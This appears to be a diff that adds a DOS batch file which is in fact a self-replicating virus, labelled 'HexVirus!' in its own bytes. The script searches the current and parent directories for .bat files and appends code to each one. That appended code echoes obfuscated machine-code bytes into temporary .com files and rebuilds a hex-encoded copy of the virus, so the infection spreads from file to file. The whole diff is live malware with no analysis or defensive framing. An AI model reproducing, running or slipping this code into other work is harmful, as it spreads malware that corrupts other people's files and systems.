@@ -1,0 +1,26 @@
+@echo off
+if !%1==!I goto I
+for %%a in (*.bat ..\*.bat) do call -h I %%a
+exit
+:I
+if %2==-H.BAT goto X
+find "-1.com"<%2>-1
+copy -1 -2>nul
+if exist -2 goto C
+echo.>>%2
+echo>>%2 @echo off
+echo>>%2 if exist -?.* goto -HV
+echo>>%2 echo ´?3Ûº¹ÀóÍ!rP‹È¾‹şë"¬<0|#<9~<A|<F,ë "%% "%%>-1.com%% "%%
+echo>>%2 echo ,0…ÛtÕªKëŠàCâÖ´@3Û³‹Ïº+ÊÍ!ë HexVirus! Ã%% "%%>>-1.com%% "%%
+echo>-2.com ´?3ÛºˆşÊ¹ vÍ!rk‹È¾ˆN¿O¸ec«¸ho«¸??şÈşÌ«¸-b«° ª¬Ô'@'ë
+echo>>-2.com †Ä'@'«Cƒû u3Û¸şÌşÈ«âÁëâÔƒû u¸şÌşÈ«´@»şÏ‹ÏºJ+ÊÍ!Ã
+-2<-h.bat>>%2
+echo.>>%2
+echo>>%2 -1%% "%%<-b>%% "%%-h.bat
+echo>>%2 command /c -h
+echo>>%2 del -?.*
+echo>>%2 :-HV
+exit
+:C
+del -?
+:X
